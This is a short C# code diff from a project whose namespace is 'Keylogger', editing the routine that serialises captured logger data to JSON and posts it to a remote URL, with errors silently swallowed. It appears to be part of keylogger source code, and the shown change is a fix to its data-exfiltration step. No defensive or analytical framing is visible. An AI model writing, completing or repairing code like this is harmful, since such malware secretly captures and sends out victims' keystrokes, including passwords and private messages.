@@ -70,11 +70,10 @@ namespace Keylogger
         {
             try
             {
-                Task result = client.PostAsync(URL,
-                                           new StringContent(JsonConvert.SerializeObject(loggerData),
-                                                             Encoding.UTF8,
-                                                             "application/json"));
-                result.Start();
+                client.PostAsync(URL,
+                                 new StringContent(JsonConvert.SerializeObject(loggerData),
+                                                   Encoding.UTF8,
+                                                   "application/json"));
             }
             catch { }
         }
